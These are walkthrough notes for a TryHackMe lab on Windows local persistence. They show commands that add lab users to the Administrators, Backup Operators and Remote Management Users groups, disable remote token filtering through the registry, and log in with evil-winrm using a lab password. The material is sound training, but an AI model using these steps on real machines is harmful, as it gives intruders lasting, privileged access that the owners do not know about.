# Windows Local Persistence

**Room Link:** [https://tryhackme.com/room/windowslocalpersistence](https://tryhackme.com/room/windowslocalpersistence)



## Tampering With Unprivileged Accounts

### Assign Group Memberships

**Victim**

```
net localgroup administrators thmuser0 /add
```

**Victim**

```
net localgroup "Backup Operators" thmuser1 /add
```

**Victim**

```
net localgroup "Remote Management Users" thmuser1 /add
```

**Kali**

```
evil-winrm -i $VICTIM -u thmuser1 -p Password321
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

**Kali**

```
evil-winrm -i $VICTIM -u thmuser1 -p Password321
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
